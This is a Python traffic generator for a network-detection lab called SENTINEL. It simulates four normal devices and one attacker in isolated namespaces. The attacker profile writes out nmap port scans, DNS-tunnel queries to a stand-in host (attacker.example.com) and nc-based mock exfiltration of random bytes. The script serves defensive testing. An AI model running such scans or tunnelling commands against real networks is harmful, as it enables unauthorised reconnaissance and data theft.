#!/usr/bin/env python3
"""
SENTINEL Lab - Gercekci Trafik Uretici
=======================================
Her namespace farkli davranis profili simule eder:
  ns-dev1 (iPhone)   - Normal: sosyal medya, DNS
  ns-dev2 (Laptop)   - Normal: web, HTTPS
  ns-dev3 (SmartTV)  - Normal: streaming, yuksek download
  ns-dev4 (Tablet)   - Normal: dusuk aktivite
  ns-dev5 (Attacker) - Saldirganic: port scan, DNS tunnel, exfil
"""
import random
import signal
import subprocess
import sys
import threading
import time

SUBNET = "10.99.0"
DEVICES = [
    {"ns": "ns-dev1", "ip": f"{SUBNET}.11", "name": "iPhone", "role": "normal_social"},
    {"ns": "ns-dev2", "ip": f"{SUBNET}.12", "name": "Laptop", "role": "normal_web"},
    {"ns": "ns-dev3", "ip": f"{SUBNET}.13", "name": "SmartTV", "role": "normal_stream"},
    {"ns": "ns-dev4", "ip": f"{SUBNET}.14", "name": "Tablet", "role": "normal_idle"},
    {"ns": "ns-dev5", "ip": f"{SUBNET}.15", "name": "Attacker", "role": "attacker"},
]

running = True


def ns_exec(ns, cmd, timeout=5):
    try:
        r = subprocess.run(
            ["ip", "netns", "exec", ns, "bash", "-c", cmd], capture_output=True, timeout=timeout
        )
        return r.returncode == 0
    except Exception:
        return False


def normal_dns(ns, domains):
    for d in random.sample(domains, min(len(domains), random.randint(2, 5))):
        ns_exec(ns, f"dig +short +time=2 {d} @8.8.8.8 > /dev/null 2>&1")


def normal_arp(ns, ips):
    for ip in random.sample(ips, min(len(ips), 2)):
        ns_exec(ns, f"arping -c 1 -w 1 {ip} > /dev/null 2>&1")


# Normal profiller
def iphone_traffic(dev):
    domains = [
        "instagram.com",
        "twitter.com",
        "facebook.com",
        "whatsapp.net",
        "icloud.com",
        "apple.com",
        "tiktok.com",
    ]
    other_ips = [f"{SUBNET}.{i}" for i in [12, 13, 14]]
    while running:
        normal_dns(dev["ns"], domains)
        normal_arp(dev["ns"], other_ips)
        if random.random() < 0.4:
            ns_exec(dev["ns"], "curl -s --max-time 3 -o /dev/null http://detectportal.firefox.com/")
        time.sleep(random.uniform(8, 20))


def laptop_traffic(dev):
    domains = [
        "google.com",
        "github.com",
        "stackoverflow.com",
        "youtube.com",
        "reddit.com",
        "amazon.com",
        "microsoft.com",
    ]
    while running:
        normal_dns(dev["ns"], domains)
        if random.random() < 0.6:
            ns_exec(dev["ns"], "curl -s --max-time 3 -o /dev/null http://neverssl.com/")
        time.sleep(random.uniform(5, 15))


def smarttv_traffic(dev):
    domains = ["netflix.com", "youtube.com", "spotify.com", "primevideo.com"]
    while running:
        normal_dns(dev["ns"], domains)
        ns_exec(
            dev["ns"],
            f"dd if=/dev/urandom bs=1024 count=128 2>/dev/null | "
            f"nc -w 1 {SUBNET}.12 9999 > /dev/null 2>&1 || true",
        )
        time.sleep(random.uniform(15, 35))


def tablet_traffic(dev):
    domains = ["google.com", "weather.com", "news.bbc.co.uk"]
    while running:
        if random.random() < 0.3:
            normal_dns(dev["ns"], domains)
        time.sleep(random.uniform(25, 60))


# Saldirgan profili
def attacker_traffic(dev):
    attack_cycle = 0
    while running:
        attack_cycle += 1
        atype = ["port_scan", "dns_tunnel", "exfil", "lateral"][attack_cycle % 4]

        if atype == "port_scan":
            print("[Attacker] Port scan basliyor...")
            for ip_last in range(11, 16):
                ns_exec(
                    dev["ns"],
                    f"nmap -T4 --open -p 22,80,443,3306,8080 "
                    f"{SUBNET}.{ip_last} -oN /dev/null > /dev/null 2>&1",
                    timeout=15,
                )
            for _ in range(20):
                ip = f"{SUBNET}.{random.randint(1, 254)}"
                ns_exec(dev["ns"], f"arping -c 1 -w 1 {ip} > /dev/null 2>&1")

        elif atype == "dns_tunnel":
            print("[Attacker] DNS tunnel basliyor...")
            bases = ["exfil", "data", "cmd", "c2", "tunnel"]
            for _ in range(random.randint(40, 80)):
                payload = "".join(random.choices("abcdef0123456789", k=32))
                domain = f"{payload}.{random.choice(bases)}.attacker.example.com"
                ns_exec(dev["ns"], f"dig TXT {domain} @8.8.8.8 +short > /dev/null 2>&1")
                time.sleep(0.1)

        elif atype == "exfil":
            print("[Attacker] Veri sizdirilmasi basliyor...")
            for _ in range(50):
                ns_exec(
                    dev["ns"],
                    f"dd if=/dev/urandom bs=1024 count=100 2>/dev/null | "
                    f"nc -w 2 {SUBNET}.1 9999 > /dev/null 2>&1 || true",
                )
                time.sleep(0.2)

        elif atype == "lateral":
            print("[Attacker] Lateral movement basliyor...")
            for ip_last in range(11, 16):
                ns_exec(
                    dev["ns"],
                    f"nmap -sU -T3 -p 53,161,500 {SUBNET}.{ip_last} "
                    f"-oN /dev/null > /dev/null 2>&1",
                    timeout=20,
                )

        print(f"[Attacker] {atype} tamamlandi")
        time.sleep(random.uniform(30, 60))


def lan_traffic():
    while running:
        src = random.choice(DEVICES[:4])
        dst = random.choice(DEVICES[:4])
        if src["ns"] == dst["ns"]:
            time.sleep(5)
            continue
        ns_exec(src["ns"], f"ping -c 2 -W 1 {dst['ip']} > /dev/null 2>&1")
        time.sleep(random.uniform(5, 15))


def signal_handler(sig, frame):
    global running
    print("\n[LAB] Trafik uretici durduruluyor...")
    running = False
    sys.exit(0)


signal.signal(signal.SIGINT, signal_handler)
signal.signal(signal.SIGTERM, signal_handler)

HANDLERS = {
    "normal_social": iphone_traffic,
    "normal_web": laptop_traffic,
    "normal_stream": smarttv_traffic,
    "normal_idle": tablet_traffic,
    "attacker": attacker_traffic,
}

print("[LAB] Trafik uretici baslatiliyor...")
print(f"[LAB] {len(DEVICES)} cihaz aktif")
print("[LAB] Durdurmak icin Ctrl+C\n")

threads = []
for dev in DEVICES:
    fn = HANDLERS.get(dev["role"])
    if fn:
        t = threading.Thread(target=fn, args=(dev,), daemon=True, name=dev["name"])
        t.start()
        threads.append(t)
        print(f"  [OK] {dev['name']:10s} ({dev['ip']}) -> {dev['role']}")

t = threading.Thread(target=lan_traffic, daemon=True, name="LAN")
t.start()

print("\n[LAB] Tum threadler calisiyor.")
print("[LAB] SENTINEL komutu: sudo python3 sentinel.py --interface br-lab\n")

try:
    while running:
        alive = sum(1 for t in threads if t.is_alive())
        print(f"[LAB] Aktif thread: {alive}/{len(threads)}", flush=True)
        time.sleep(30)
except KeyboardInterrupt:
    running = False
